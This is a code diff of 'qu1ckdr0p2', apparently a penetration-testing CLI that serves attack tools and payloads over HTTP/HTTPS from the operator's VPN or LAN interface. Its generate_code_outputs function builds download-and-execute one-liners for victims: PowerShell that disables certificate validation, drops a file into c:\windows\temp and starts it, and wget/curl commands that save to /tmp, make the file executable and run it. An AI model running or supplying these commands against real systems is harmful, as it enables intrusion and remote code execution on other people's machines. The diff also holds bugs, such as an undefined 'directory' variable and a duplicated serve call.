@@ -1,70 +1,54 @@
 from flask import Flask, send_from_directory
+from flask.logging import request
 from tqdm import tqdm
+from halo import Halo
 from OpenSSL import crypto
 import os
 import netifaces as ni
 import logging
 import click
 import configparser
-import requests
-import zipfile
-import shutil
 import subprocess
+import signal
+import sys
 
+
+cli = sys.modules['flask.cli']
+cli.show_server_banner = lambda *x: None
+app = Flask(__name__)
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
+logging.basicConfig(level=logging.INFO)
+
+user_home = os.path.expanduser("~")
+base_dir = os.path.join(user_home, ".qu1ckdr0p2")
+directory = os.path.dirname(os.path.abspath(__file__))
+
+target_directories = ["config", "windows", "linux", "mac", "windows/powershell", "windows/powershell/PowerSharpPack/PowerSharpBinaries", "windows/powershell/PowerSharpPack"]
+other_directories = ["payloads", "certs"]
+
+payloads = os.path.join(user_home, ".qu1ckdr0p2", 'payloads')
+cert_dir = os.path.join(user_home, ".qu1ckdr0p2", 'certs')
+
+cert_path = os.path.join(cert_dir, 'cert.pem')
+key_path = os.path.join(cert_dir, 'key.pem')
+cert = "cert.pem"
+privkey = "key.pem"
+
 config = configparser.ConfigParser()
-script_dir = os.path.dirname(os.path.abspath(__file__))
-common_ini_path = os.path.join(script_dir, 'config/common.ini')
+common_ini_path = os.path.join(base_dir, 'config/common.ini')
 config.read(common_ini_path)
-# print(config.sections())
-# print(config.items("._DIR"))
-# Not sorting out other platforms for now
-blacklist_keywords = ['sample', 'arm64', 'readme.md', 'readme', 'license', 'mips', 'mips64', 'mipsle', 'ppc', 's390', 'arm', 'aarch64', 'armv7', 'armv8', 'armv6', 'armv5', 'armv4', 'armv3', 'armv2', 'armv1', 'armv0', 'armv', 'arm64', 'armle', 'armbe', 'armhf', 'armel', 'arm64', 'armv7', 'armv8', 'armv6', 'armv5', 'armv4', 'armv3', 'armv2', 'armv1', 'armv0', 'armv', 'arm64', 'armle', 'armbe', 'armhf', 'armel', 'arm64', 'armv7', 'armv8', 'armv6', 'armv5', 'armv4', 'armv3', 'armv2', 'armv1', 'armv0', 'armv', 'arm64', 'armle', 'armbe', 'armhf', 'armel', 'arm64', 'armv7', 'armv8', 'armv6', 'armv5', 'armv4', 'armv3', 'armv2', 'armv1', 'armv0', 'armv', 'arm64', 'armle', 'armbe', 'armhf', 'armel', 'arm64', 'armv7', 'armv8', 'armv6', 'armv5', 'armv4', 'armv3', 'armv2', 'armv1', 'armv0', 'armv', 'arm64', 'armle', 'armbe', 'armhf', 'armel', 'arm64', 'armv7', 'armv8', 'armv6', 'armv5', 'armv4', 'armv3', 'armv2', 'armv1', 'armv0', 'armv', 'arm64', 'armle', 'armbe', 'armhf', 'armel', 'arm64', 'armv7', 'armv8', 'armv6', 'armv5', 'armv4', 'armv3', 'armv2', 'armv1', 'armv0', 'armv']
-@click.group()
-def cli():
-    pass
-def generate_self_signed_cert(cert_dir):
-    if not os.path.exists(cert_dir):
-        os.makedirs(cert_dir)
+aliases = {}
+for section in config.sections():
+    for key, value in config.items(section):
+        aliases[key.lower()] = os.path.join(base_dir, value)
 
-    cert_path = os.path.join(cert_dir, 'cert.pem')
-    key_path = os.path.join(cert_dir, 'key.pem')
+def signal_handler(signum, frame):
+    click.echo(click.style(f"\n[*] ", fg='green') + click.style("CTRL+C detected, quitting\n", fg='yellow'))
+    sys.exit(0)
 
-    if not os.path.exists(cert_path) or not os.path.exists(key_path):
-        key = crypto.PKey()
-        key.generate_key(crypto.TYPE_RSA, 2048)
-
-        cert = crypto.X509()
-        cert.get_subject().C = "US"
-        cert.get_subject().ST = "CA"
-        cert.get_subject().L = "San Francisco"
-        cert.get_subject().O = "qu1ckdr0p2"
-        cert.get_subject().OU = "qu1ckdr0p2"
-        cert.get_subject().CN = "byinarie@deadcell.dev"
-        cert.set_serial_number(1000)
-        cert.gmtime_adj_notBefore(0)
-        cert.gmtime_adj_notAfter(315360000)  # Valid for 10 years
-        cert.set_issuer(cert.get_subject())
-        cert.set_pubkey(key)
-        cert.sign(key, 'sha256')
-
-        with open(cert_path, 'wb') as cert_file:
-            cert_file.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
-
-        with open(key_path, 'wb') as key_file:
-            key_file.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, key))
-
-        click.echo(click.style(f"[+] Certificate and key generated at {cert_path} and {key_path}", fg='green'))
-
-    return cert_path, key_path
-
-def create_directories():
-    directories = ["downloads", "windows", "linux", "mac"]
-    for directory in directories:
-        if not os.path.exists(directory):
-            os.makedirs(directory)
-            
+signal.signal(signal.SIGINT, signal_handler)
+                
 def get_interface_ip(interface):
     try:
         ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
@@ -73,225 +57,341 @@ def get_interface_ip(interface):
         return None
 
 def get_serving_ip():
-    tun0_ip = get_interface_ip('tun0')
-    if tun0_ip:
-        return tun0_ip
-    eth0_ip = get_interface_ip('eth0')
-    if eth0_ip:
-        return eth0_ip
-    return '0.0.0.0'
-
-
-def extract_archive(archive_path, download_directory):
-    file_list = []
-
-    for root, _, files in os.walk(download_directory):
-        for file in files:
-            file_extension = os.path.splitext(file)[1]
-            if file_extension in ['.zip', '.gz', '.tar.gz', '.tgz', '.tar.bz2', '.tbz2', '.tbz', '.tar.xz', '.txz', '.tar']:
-                file_list.append(os.path.join(root, file))
-
-    for file in tqdm(file_list, desc='Extracting archives', unit='archive'):
+    interfaces = ['tun0', 'eth0']
+    for interface in interfaces:
         try:
-            filename = os.path.basename(file)
-            file_extension = os.path.splitext(filename)[-1]
-            archive_path = os.path.join(root, file)
-
-            if file_extension == '.zip':
-                with zipfile.ZipFile(archive_path, 'r') as zip_ref:
-                    zip_ref.extractall(download_directory)
-
-                    for subdir, _, files in os.walk(download_directory):
-                        for sub_file in files:
-                            if subdir != download_directory:  # Avoid moving files that are already in the target directory, eventually this should be removed
-                                src_path = os.path.join(subdir, sub_file)
-                                dest_path = os.path.join(download_directory, sub_file)
-                                shutil.move(src_path, dest_path)
-
-                    for subdir in [d for d in os.listdir(download_directory) if os.path.isdir(os.path.join(download_directory, d))]:
-                        shutil.rmtree(os.path.join(download_directory, subdir))
-            elif file_extension in ['.tar.gz', '.tgz', '.tar.bz2', '.tbz2', '.tbz', '.tar.xz', '.txz', '.tar']:
-                os.system(f"tar -xvf {archive_path} -C {download_directory}")
-            elif file_extension == '.gz':
-                os.system(f"gunzip -d {archive_path} {download_directory}")
+            ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
+            return ip, interface
         except Exception as e:
-            click.echo(click.style(f"[-] Failed to extract {filename}", fg='red'))
-        finally:
-            click.echo(click.style(f"[+] Extracted {filename} to {download_directory}", fg='green'))
-
-           
-def process_file(file_path):
-    files = os.listdir(file_path)
-    linux = os.getcwd() + "/linux"
-    mac = os.getcwd() + "/mac"
-    windows = os.getcwd() + "/windows"
-    blacklist_keywords = ["readme.md", "license", "file hash.txt"]  
-
-    for filename in tqdm(files, desc='Processing files', unit='file'):
-        if filename.lower() in [name.lower() for name in blacklist_keywords]:
             continue
-        
-        file_full_path = os.path.join(file_path, filename)
-        try:
-            file_type = subprocess.check_output(["file", "--brief", file_full_path]).decode().strip()
-            
-            if "executable" in file_type and "ELF" in file_type:
-                shutil.copy(file_full_path, linux)
-            elif "Mach-O" in file_type:
-                shutil.copy(file_full_path, mac)
-            elif "MS-DOS executable" in file_type or "PE32" in file_type:
-                shutil.copy(file_full_path, windows)
-            elif "Bourne-Again shell script" in file_type or "POSIX shell script" in file_type:
-                shutil.copy(file_full_path, linux)
-            elif "ASCII text" in file_type:
-                shutil.copy(file_full_path, windows)
-        except subprocess.CalledProcessError:
-            click.echo(click.style(f"[-] Failed to process {filename}", fg='red'))
+    return '0.0.0.0', 'None'
 
-def download_latest_release(tool_name, release_url, download_dir):
-    config = configparser.ConfigParser()
-    config.read('config/settings.ini')
-    api_key = config['GitHub']['API_KEY']
-    headers = {'Authorization': f'token {api_key}'}
-    user, repo = release_url.split('/')[3:5]
-    api_url = f'https://api.github.com/repos/{user}/{repo}/releases/latest'
-    response = requests.get(api_url, headers=headers)
-    if response.status_code != 200:
-        click.echo(click.style(f"[-] Failed to fetch the latest release for {tool_name}", fg='red'))
-        return
+def generate_self_signed_cert(cert_dir):
+    if not os.path.exists(cert_dir):
+        os.makedirs(cert_dir)
 
-    assets = response.json().get('assets', [])
-    for asset in assets:
-        if 'source' in asset['name'] or any(keyword in asset['name'] for keyword in blacklist_keywords):
-            continue
-
-        download_url = asset['browser_download_url']
-        response = requests.get(download_url, stream=True)
-        file_path = os.path.join(download_dir, asset['name'])
-        with open(file_path, 'wb') as file:
-            shutil.copyfileobj(response.raw, file)
-        click.echo(click.style(f"[+] Downloaded {tool_name} to {file_path}", fg='green'))
-        
-def download_latest_releases(download_dir):
-    config = configparser.ConfigParser()
-    config.read('config/repos.ini')
-    repos = list(config.items('REPOS'))
+    cert_path = os.path.join(cert_dir, 'cert.pem')
+    key_path = os.path.join(cert_dir, 'key.pem')
     
-    # print("Repos:", repos) for debugging
+    if not os.path.exists(cert_path) or not os.path.exists(key_path):
+        key = crypto.PKey()
+        key.generate_key(crypto.TYPE_RSA, 2048)
+        
+        cert = crypto.X509()
+        cert.get_subject().C = "US"
+        cert.get_subject().ST = "CA"
+        cert.get_subject().L = "San Francisco"
+        cert.get_subject().O = "qu1ckdr0p2"
+        cert.get_subject().OU = "qu1ckdr0p2"
+        cert.get_subject().CN = "localhost"
+        cert.set_serial_number(1000)
+        cert.gmtime_adj_notBefore(0)
+        cert.gmtime_adj_notAfter(315360000)
+        cert.set_issuer(cert.get_subject())
+        cert.set_pubkey(key)
+        cert.sign(key, 'sha256')
+        
+        with open(cert_path, 'wb') as cert_file:
+            cert_file.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
+        
+        with open(key_path, 'wb') as key_file:
+            key_file.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, key))
+    
+    return cert_path, key_path
 
-    with tqdm(repos, desc="Downloading repositories", unit="repo") as t:
-        for tool_name, release_url in t:
-            download_latest_release(tool_name, release_url, download_dir)     
-             
-def update_repositories(file_path, download_dir):
-    create_directories()
-    script_dir = os.path.dirname(os.path.abspath(__file__))
-    downloads_dir = os.path.join(script_dir, 'downloads')
-    download_latest_releases(downloads_dir)
-
-    extract_archive(file_path, download_directory)
-
-    process_file(file_path)
-
-
-
-@cli.command()
-def update():
-    """Update tools in linux/ mac/ and windows/ (messy but works)"""
-    update_repositories(download_directory, target_directory)
-
-
-@cli.command()
-@click.argument('alias', type=str, required=False)
-@click.option('-d', '--directory', type=click.Path(exists=True, file_okay=False), help='Path to the directory to serve.')
-@click.option('-f', '--file', type=click.Path(exists=True, dir_okay=False), help='Path to the file to serve.')
-@click.option('--https', is_flag=True, help='Use HTTPS instead of HTTP.')
-@click.option('--port', default=80, help='Port number to run the server on.')
-def serve(alias=None, directory=None, file=None, https=False, port=8080):
-    """Serve your bin: serv.py $alias, serv.py -d $dir, or serv.py -f $file"""
-
-    script_dir = os.path.dirname(os.path.abspath(__file__))
-    common_ini_path = os.path.join(script_dir, 'config/common.ini')
-    config.read(common_ini_path)
-    if directory and file:
-        click.echo(click.style(f"[-] Please provide either a directory path or a file path, not both.", fg='red'))
-        return
-
-    if https:
-        cert_dir = 'certs/'
-        cert_path, key_path = generate_self_signed_cert(cert_dir)
-        ssl_context = (cert_path, key_path)
+def list_aliases(search, use, port):
+    if use:
+        invoke_serve_by_number(search, use, port=port)
     else:
-        ssl_context = None
-
-    if directory:
-        path_to_serve = directory
-    elif file:
-        path_to_serve = file
-    elif alias:
-        dir_section = None
-        for section in config.sections():
-            if alias in config[section]:
-                dir_section = section
-                break
-
-        if dir_section:
-            relative_path = config.get(dir_section, alias, fallback=None)
-            path_to_serve = os.path.join(script_dir, relative_path)
-        else:
-            click.echo(click.style(f"[-] Alias '{alias}' not found in config/common.ini.", fg='red'))
-            return
-    else:
-        path_to_serve = os.getcwd()
-
-    ip_address = get_serving_ip()
-    protocol = 'https' if https else 'http'
-    app = Flask(__name__)
-
-    if os.path.isdir(path_to_serve):
-        click.echo(click.style(f"[+] Serving at {protocol}://{ip_address}:{port}/", fg='green'))
-        for filename in os.listdir(path_to_serve):
-            click.echo(click.style(f"{protocol}://{ip_address}:{port}/{filename}", fg='green'))
-    else:
-        filename = os.path.basename(path_to_serve)
-        click.echo(click.style(f"[+] Serving at {protocol}://{ip_address}:{port}/{filename}", fg='green'))
-
-    @app.route('/<path:filename>')
-    def serve_directory(filename):
-        if os.path.isdir(path_to_serve):
-            full_path = os.path.join(path_to_serve, filename)
-        else:
-            full_path = path_to_serve if filename == os.path.basename(path_to_serve) else None
-
-        if full_path and os.path.exists(full_path):
-            return send_from_directory(os.path.dirname(full_path), os.path.basename(full_path))
-        return "File not found", 404
-
-    app.run(host=ip_address, port=port, ssl_context=ssl_context)
+        display_aliases(search)
 
 def display_aliases(search=None):
-    config = configparser.ConfigParser()
-    script_dir = os.path.dirname(os.path.abspath(__file__))
-    common_ini_path = os.path.join(script_dir, 'config/common.ini')
-    config.read(common_ini_path)
+    counter = 1
+    for alias, path in aliases.items():
+        if search:
+            search_lower = search.lower()
+            if not (search_lower in alias.lower() or search_lower in path.lower()):
+                continue
 
+        display_path = path.replace(os.path.expanduser("~"), "~")        
+        click.echo(click.style(f"\n[→] ", fg='green') + click.style("Path: ", fg='yellow') + click.style(f"{display_path}", fg='blue'))
+        click.echo(click.style(f"[→] ", fg='green') + click.style(f"Alias: ", fg='yellow') + click.style(f"{alias}", fg='blue'))
+        click.echo(click.style(f"[→] ", fg='green') + click.style("Use: ", fg='yellow') + click.style(f"{counter}", fg='blue'))
+        counter += 1
+
+def load_config(file_path):
+    config = configparser.ConfigParser()
+    config.read(file_path)
+    aliases = {}
     for section in config.sections():
         for key, value in config.items(section):
-            alias_name = key
-            alias_path = value
-            if search and (search.lower() not in alias_name.lower() and search.lower() not in alias_path.lower()):
-                continue
-            click.echo(click.style(f"Alias: {alias_name}\nPath: {alias_path}\n", fg='green'))
+            aliases[key.lower()] = os.path.join(base_dir, value)
+    return aliases
 
-@cli.command(name="list")
-@click.option('--search', type=str, help='Search for a specific alias using a search string.')
-def list_aliases(search):
-    """List all aliases or search for a specific alias."""
-    display_aliases(search)  
 
+def generate_code_outputs(protocol, ip_address, port, filename):
+    code_outputs = []
+
+    if filename:
+        if protocol == 'https':
+            csharp_ignore_tls = (
+                f"Add-Type -TypeDefinition \"using System.Net;using System.Security.Cryptography.X509Certificates;"
+                f"public class SSLValidator {{public static void Ignore() {{ServicePointManager.ServerCertificateValidationCallback += "
+                f"(sender, certificate, chain, sslPolicyErrors) => true;}}}}\" -Language CSharp; [SSLValidator]::Ignore();"
+                f" $webclient = New-Object System.Net.WebClient; $webclient.DownloadFile('{protocol}://{ip_address}:{port}/{filename}', 'c:\\windows\\temp\\{filename}');Start-Process 'c:\\windows\\temp\\{filename}'"
+            )
+
+            wget_ignore_tls = f"wget --no-check-certificate {protocol}://{ip_address}:{port}/{filename} -O /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}"
+
+            curl_ignore_tls = f"curl -k {protocol}://{ip_address}:{port}/{filename} -o /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}"
+
+            powershell_ignore_tls = ( 
+                            f"$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols; $WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile('{protocol}://{ip_address}:{port}/{filename}', 'c:\\windows\\temp\\{filename}'); Start-Process 'c:\\windows\\temp\\{filename}'"
+            )
+
+            code_outputs.extend([
+                ("csharp_ignore_tls", csharp_ignore_tls),
+                ("wget_ignore_tls", wget_ignore_tls),
+                ("curl_ignore_tls", curl_ignore_tls),
+                ("powershell_ignore_tls", powershell_ignore_tls),
+            ])
+
+        else:
+            csharp = (
+                f"$webclient = New-Object System.Net.WebClient; $webclient.DownloadFile('{protocol}://{ip_address}:{port}/{filename}', 'c:\\windows\\temp\\{filename}'); Start-Process 'c:\\windows\\temp\\{filename}'"
+            )
+
+            wget = f"wget {protocol}://{ip_address}:{port}/{filename} -O /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}"
+
+            curl = f"curl {protocol}://{ip_address}:{port}/{filename} -o /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}"
+
+            powershell = f"Invoke-WebRequest -Uri {protocol}://{ip_address}:{port}/{filename} -OutFile c:\\windows\\temp\\{filename}; Start-Process c:\\windows\\temp\\{filename}"
+
+            code_outputs.extend([
+                ("csharp", csharp),
+                ("wget", wget),
+                ("curl", curl),
+                ("powershell", powershell),
+            ])
+        
+
+    return code_outputs
+
+def print_server_info(path_to_serve, protocol, ip_address, interface_name, port, filename, cert=None, privkey=None):
+    click.clear()
+    base_dir = os.getcwd()  
+    relative_path = os.path.relpath(path_to_serve, start=base_dir)
+    
+    click.echo(click.style(f"[→] ", fg='green') + click.style("Serving:", fg='yellow') + click.style(f" {relative_path}", fg='blue'))
+    click.echo(click.style(f"[→] ", fg='green') + click.style("Protocol:", fg='yellow') + click.style(f" {protocol}", fg='blue'))
+    click.echo(click.style(f"[→] ", fg='green') + click.style("IP address:", fg='yellow') + click.style(f" {ip_address}", fg='blue'))
+    click.echo(click.style(f"[→] ", fg='green') + click.style("Port:", fg='yellow') + click.style(f" {port}", fg='blue'))
+    click.echo(click.style(f"[→] ", fg='green') + click.style("Interface:", fg='yellow') + click.style(f" {interface_name}", fg='blue'))
+
+    if cert and privkey:
+        click.echo(click.style(f"[→] ", fg='green') + click.style("Using cert:", fg='yellow') + click.style(f" {cert}", fg='blue'))
+        click.echo(click.style(f"[→] ", fg='green') + click.style("Using key:", fg='yellow') + click.style(f" {privkey}", fg='blue'))
+
+    click.echo(click.style(f"[→] ", fg='green') + click.style("CTRL+C to quit", fg='yellow'))
+    click.echo(click.style(f"\n[→] ", fg='green') + click.style("URL:", fg='yellow') + click.style(f" {protocol}://{ip_address}:{port}/{filename}\n", fg='blue'))
+
+    code_outputs = generate_code_outputs(protocol, ip_address, port, filename)
+    for code_type, code_output in code_outputs:
+        click.echo(click.style(f"[↓] ", fg='green') + click.style(f"{code_type}:\n", fg='yellow') + click.style(f"{code_output}\n", fg='blue'))
+
+    spinner = Halo(spinner='dots', color='cyan', text_color='yellow')
+    spinner.start("Web server running")
+
+
+          
+def serve_files(path_to_serve, http_port=80, https_port=443):
+    path_to_serve = os.path.abspath(path_to_serve)
+    print(path_to_serve)
+    if os.path.isdir(path_to_serve):
+        @app.route('/')
+        def index():
+            files = os.listdir(path_to_serve)
+            file_links = [f'<a href="/{file}">{file}</a><br>' for file in files]
+            return '\n'.join(file_links)
+        
+        @app.route('/<path:filename>')
+        def serve_file(filename):
+            return send_from_directory(path_to_serve, filename)
+        
+        filename = os.path.basename(path_to_serve)
+    else:
+        directory, filename = os.path.split(path_to_serve)   
+                
+        @app.route('/')
+        def index():
+            return f'<a href="/{filename}">-> {filename}</a>'
+        
+        @app.route(f'/{filename}')
+        def serve_file():
+            return send_from_directory(directory, filename)
+
+    protocol = "http" if http_port else "https"
+    ip_address, interface_name = get_serving_ip()
+    port = http_port or https_port
 
     
+    cert_path, key_path = None, None
+    if https_port:
+        cert_path, key_path = generate_self_signed_cert(cert_dir)
+        
+    print_server_info(path_to_serve, protocol, ip_address, interface_name, port, filename, cert_path, key_path)
+
+    @app.before_request
+    def log_request_info():
+        client_ip = request.remote_addr
+        client_method = request.method
+        client_path = request.url
+        click.echo(click.style(f"\n[→] ", fg='green') + click.style("Client Connected: ", fg='yellow') + click.style(f"{client_ip}", fg='blue'))
+        click.echo(click.style(f"[→] ", fg='green') + click.style("Method: ", fg='yellow') + click.style(f"{client_method}", fg='blue'))
+        click.echo(click.style(f"[→] ", fg='green') + click.style("Path: ", fg='yellow') + click.style(f"{client_path}", fg='blue'))
+
+    @app.after_request
+    def log_response(response):
+        if response.status_code == 200:
+            click.echo(click.style(f"[→] ", fg='green') + click.style("Success: ", fg='yellow') + click.style(f"HTTP {response.status_code}", fg='blue'))
+        else:
+            click.echo(click.style(f"[*] ", fg='red') + click.style("Failed: ", fg='yellow') + click.style(f"HTTP {response.status_code}", fg='red'))
+            click.echo(click.style(f"[*] ", fg='red') + click.style("Failure Message: ", fg='yellow') + click.style(f"{response.status}\n", fg='red'))
+        return response
+
+    if http_port:
+        app.run(host='0.0.0.0', port=http_port, threaded=True)
+    elif https_port:
+        cert_path, key_path = generate_self_signed_cert(cert_dir)
+        if cert_path and key_path:
+            app.run(host='0.0.0.0', port=https_port, ssl_context=(cert_path, key_path), threaded=True)
+        else:
+            click.echo(click.style(f"\n[*] ", fg='red') + click.style("Could not generate or find SSL certificates.\n", fg='yellow'))
+
+    
+def invoke_serve_by_number(search=None, use=None, http=None, https=None):
+    search_results = {alias: path for alias, path in aliases.items() if search.lower() in alias.lower() or search.lower() in path.lower()}
+    if use > len(search_results) or use < 1:
+        click.echo(click.style(f"\n[*] ", fg='red') + click.style("The number provided with --use is out of range.\n", fg='yellow'))
+        return
+    
+    selected_alias = list(search_results.keys())[use - 1]
+    selected_path = search_results[selected_alias]
+    
+    if not http and not https:
+        https = 443
+    
+    serve_files(selected_path, http, https)
+    
+    selected_alias = list(search_results.keys())[use - 1]
+    selected_path = search_results[selected_alias]
+    serve_files(selected_path, http, https)
+
+def list_local_files(directory_path):
+    return set(os.listdir(directory_path))
+
+def update_self_function():
+    try:
+        subprocess.run(['pip', 'install', '--upgrade', 'qu1ckdr0p2'], check=True)
+        click.echo(click.style(f"[→] ", fg='green') + click.style("Successfully updated qu1ckdr0p2\n\n", fg='blue'))
+    except subprocess.CalledProcessError as e:
+        click.echo(click.style(f"[*] ", fg='red') + click.style("Failed to update {e}\n\n", fg='red'))
+                 
+    
+@click.group()
+@click.option('--debug', is_flag=True, help='Enable debug mode.')
+@click.pass_context
+def cli(ctx, debug):
+    """Welcome to qu1ckdr0p2 entry point."""
+    ctx.ensure_object(dict)
+    ctx.obj['DEBUG'] = debug
+    
+    if debug:
+        log.setLevel(logging.DEBUG)
+        app.debug = True
+        logging.basicConfig(level=logging.DEBUG)
+        click.echo(click.style('[*] ', fg='red') + click.style('Debug mode enabled', fg='red', blink=True, bold=True))
+          
+@cli.command(context_settings={"help_option_names": ['-h', '--help']})
+@click.option('-l', '--list', 'list_flag', is_flag=True, help="List aliases")
+@click.option('-s', '--search', type=str, required=False, help="Search query for aliases")
+@click.option('-u', '--use', type=int, required=False, help="Use an alias by a dynamic number")
+# @click.option('-d', '--directory', type=click.Path(exists=True, file_okay=False), help="Serve a directory")
+@click.option('-f', '--file', type=click.Path(exists=True, dir_okay=False), help="Serve a file")
+@click.option('--http', type=int, default=None, help="Use HTTP with a custom port")
+@click.option('--https', type=int, default=None, help="Use HTTPS with a custom port")
+@click.pass_context
+def serve(ctx, list_flag, search, use, file, http, https):
+    """Serve files."""          
+    if not any([list_flag, search, use, file, http, https]):
+        click.echo(ctx.get_help())
+        return
+        
+    if list_flag:
+        list_aliases(None, None, None)
+        return
+
+    if search:
+        if use is not None:
+            invoke_serve_by_number(search, use, http, https)
+        else:
+            list_aliases(search, None, None)
+        return
+
+    if use is not None:
+        click.echo(click.style(f"\n[*] ", fg='red') + click.style("You must provide a search term along with --use.\n", fg='yellow'))
+        return
+
+    if directory:
+        if not http and not https:
+            https = 443  
+        serve_files(directory, http, https)
+        return
+
+    if file:
+        file = os.path.abspath(file)  # Convert to absolute path
+        if not http and not https:
+            https = 443  
+        serve_files(file, http, https)
+        return 
+
+@cli.command()
+@click.option('--update', is_flag=True, help='Check and download missing tools.')
+@click.option('--update-self', is_flag=True, help='Update the tool using pip.')
+@click.option('--update-self-test', is_flag=True, help='Used for dev testing, installs unstable build.')
+def init(update, update_self, update_self_test):
+    """Perform updates."""
+    if update:
+        check_and_update_tools()
+    if update_self:
+        update_pip3()
+
+
+def check_and_update_tools():
+    if not os.path.exists(base_dir):
+        click.echo(click.style(f"\n[*] ", fg='green') + click.style("Cloning qu1ckdr0p2-tools from GitHub.\n", fg='yellow'))
+        try:
+            subprocess.run(["git", "clone", "https://github.com/byinarie/qu1ckdr0p2-tools.git", base_dir], check=True)
+        except subprocess.CalledProcessError as e:
+            click.echo(click.style(f"\n[*] ", fg='red') + click.style("Failed to clone qu1ckdr0p2-tools from GitHub.\n", fg='yellow'))
+    else:
+        print(f"Directory {base_dir} exists. Pulling latest changes.")
+        click.echo(click.style(f"\n[*] ", fg='green') + click.style("Pulling latest changes from GitHub.\n", fg='yellow'))
+        try:
+            subprocess.run(["git", "-C", base_dir, "pull"], check=True)
+        except subprocess.CalledProcessError as e:
+            print(f"Error occurred: {e}")   
+            click.echo(click.style(f"\n[*] ", fg='red') + click.style("Failed to pull latest changes from GitHub.\n", fg='yellow'))
+
+def update_pip3():
+    """Update the tool using pip."""
+    try:
+        subprocess.run(['pip3', 'install', '--upgrade', 'qu1ckdr0p2'], check=True)
+        click.echo(click.style(f"[→] ", fg='green') + click.style("Successfully updated qu1ckdr0p2\n\n", fg='blue'))
+    except subprocess.CalledProcessError as e:
+        click.echo(click.style(f"[*] ", fg='red') + click.style("Failed to update {e}\n\n", fg='red'))
+                            
 if __name__ == "__main__":
-    download_directory = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'downloads/')
     target_directory = os.path.dirname(os.path.abspath(__file__))   
-    cli()
+    cli(obj={})
+    
